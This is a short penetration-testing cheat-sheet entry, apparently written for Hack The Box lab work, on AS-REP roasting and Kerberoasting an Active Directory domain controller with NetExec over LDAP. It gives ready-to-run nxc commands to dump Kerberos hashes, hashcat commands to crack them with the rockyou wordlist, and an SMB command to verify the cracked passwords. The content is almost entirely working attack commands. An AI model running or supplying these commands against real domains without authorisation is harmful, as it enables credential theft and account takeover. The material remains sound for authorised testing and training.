# 06.02 AS-REP Kerberoast via CME

> Roast AS-REP (`-m 18200`) and Kerberoast (`-m 13100`) hashes via NetExec's LDAP module to file for offline cracking.

## Overview

CME LDAP module performs AS-REP roasting (no pre-auth required, can use a username list without any password) and Kerberoasting (requires valid credentials), outputting hashes to file for offline cracking. Crack AS-REP hashes with hashcat mode 18200; Kerberoast TGS hashes with mode 13100.

## Steps

- AS-REP roast with a user list and empty password — finds accounts with pre-auth disabled.
- AS-REP roast with valid credentials — returns all vulnerable accounts in the domain.
- Kerberoasting requires valid credentials; returns all SPN accounts with TGS tickets.
- Both require LDAP FQDN as target (not bare IP).
- Crack AS-REP: `hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt`
- Crack Kerberoast: `hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt`
- Verify cracked accounts with `nxc smb <DC> -u <user> -p <cracked_pass>`.

## Commands

### AS-REP roast with username list (no creds)

```bash
nxc ldap dc01.<DOMAIN>.htb -u users.txt -p '' --asreproast asreproast.out
```

### AS-REP roast with valid credentials

```bash
nxc ldap dc01.<DOMAIN>.htb -u grace -p <PASS> --asreproast asreproast.out
```

### Kerberoasting

```bash
nxc ldap dc01.<DOMAIN>.htb -u grace -p '<PASS>' --kerberoasting kerberoasting.out
```

### Crack AS-REP hashes

```bash
hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt
```

### Crack Kerberoast hashes

```bash
hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt
```
